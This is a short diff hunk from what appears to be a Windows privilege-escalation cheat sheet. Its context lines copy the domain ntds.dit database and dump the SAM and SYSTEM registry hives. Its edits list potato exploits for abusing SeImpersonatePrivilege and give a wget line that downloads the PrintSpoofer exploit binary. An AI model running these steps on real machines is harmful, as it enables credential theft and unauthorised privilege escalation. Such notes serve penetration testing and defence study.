@@ -400,8 +400,8 @@ Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit .\ntds.dit
 reg save HKLM\SYSTEM system
 reg save HKLM\SAM sam
 ```
-### Abuse SeImpersonatePrivilege
-Named Pipes(PrintSpoofer)
+### Abuse SeImpersonatePrivilege(GodPotato->RoguePotato->JuicyPotato->JuicyPotatoNG->PrintSpoofer)
+Named Pipes(PrintSpoofer)->sc query spooler
 ```
 Requirements: SeImpersonatePrivilege has to be enabled
 Download address: wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
